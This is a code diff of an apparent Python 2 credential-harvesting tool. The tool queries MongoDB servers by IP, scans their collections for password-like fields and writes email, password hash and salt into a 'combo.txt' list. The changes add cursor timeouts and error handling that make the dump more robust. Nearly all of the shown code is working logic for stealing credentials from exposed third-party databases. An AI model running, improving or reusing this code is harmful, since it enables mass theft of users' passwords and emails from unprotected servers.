@@ -4,6 +4,7 @@ import json
 import re
 from colorlog import ColoredFormatter
 from pymongo import MongoClient
+from pymongo import errors as mongo_errors
 import io
 import os
 import smtplib
@@ -165,7 +166,7 @@ Rows: {2}
                     break
 
                 for collection in collections:
-                    if collection in ['system.index']:
+                    if collection in ['system.indexes']:
                         continue
 
                     self.logger.debug("\t\tAnalyzing collection: " + collection)
@@ -210,7 +211,7 @@ Rows: {2}
                                 email_field = key
                                 break
 
-                    rows = o_coll.find()
+                    rows = o_coll.find().max_time_ms(10000)
                     total = rows.count()
 
                     if total > 750:
@@ -220,48 +221,51 @@ Rows: {2}
 
                     lines = []
 
-                    for row in rows:
-                        try:
-                            email = row[email_field]
-                            if not email:
-                                email = ''
-                        except:
-                            email = ''
-
-                        for key, value in row.iteritems():
+                    try:
+                        for row in rows:
                             try:
-                                # Is that a column we're interested into?
-                                if any(column in key for column in self.column_names):
-                                    # Skip empty values
-                                    if not value:
-                                        continue
+                                email = row[email_field]
+                                if not email:
+                                    email = ''
+                            except:
+                                email = ''
 
-                                    # Skip fields that are not strings (ie reset_pass_date => datetime object)
-                                    if not isinstance(value, basestring):
-                                        continue
+                            for key, value in row.iteritems():
+                                try:
+                                    # Is that a column we're interested into?
+                                    if any(column in key for column in self.column_names):
+                                        # Skip empty values
+                                        if not value:
+                                            continue
 
-                                    # Try to fetch the salt, if any
-                                    try:
-                                        salt = row['salt'].encode('utf-8')
-                                        if not salt:
+                                        # Skip fields that are not strings (ie reset_pass_date => datetime object)
+                                        if not isinstance(value, basestring):
+                                            continue
+
+                                        # Try to fetch the salt, if any
+                                        try:
+                                            salt = row['salt'].encode('utf-8')
+                                            if not salt:
+                                                salt = ''
+                                        except:
                                             salt = ''
-                                    except:
-                                        salt = ''
 
-                                    value = value.encode('utf-8') + ':' + salt
+                                        value = value.encode('utf-8') + ':' + salt
 
-                                    lines.append(unicode(ip.encode('utf-8') + '|' + email + ':' + value + '\n'))
-                            except UnicodeDecodeError:
-                                # You know what? I'm done dealing with all those crazy encodings
-                                self.logger.warn("An error occurred while encoding the string. Skipping")
-                                continue
+                                        lines.append(unicode(ip.encode('utf-8') + '|' + email + ':' + value + '\n'))
+                                except UnicodeDecodeError:
+                                    # You know what? I'm done dealing with all those crazy encodings
+                                    self.logger.warn("An error occurred while encoding the string. Skipping")
+                                    continue
 
-                        # If I get a very long list, let's write it in batches
-                        if len(lines) >= 1000:
-                            self.logger.info("\t\tWriting " + str(len(lines)) + "/" + str(total) + " records")
-                            with io.open('data/combo.txt', 'a', encoding='utf-8') as fp_pass:
-                                fp_pass.writelines(lines)
-                                lines = []
+                            # If I get a very long list, let's write it in batches
+                            if len(lines) >= 1000:
+                                self.logger.info("\t\tWriting " + str(len(lines)) + "/" + str(total) + " records")
+                                with io.open('data/combo.txt', 'a', encoding='utf-8') as fp_pass:
+                                    fp_pass.writelines(lines)
+                                    lines = []
+                    except mongo_errors.ExecutionTimeout:
+                        self.logger.warning("Cursor timed out, skipping")
 
                     with io.open('data/combo.txt', 'a', encoding='utf-8') as fp_pass:
                         fp_pass.writelines(lines)
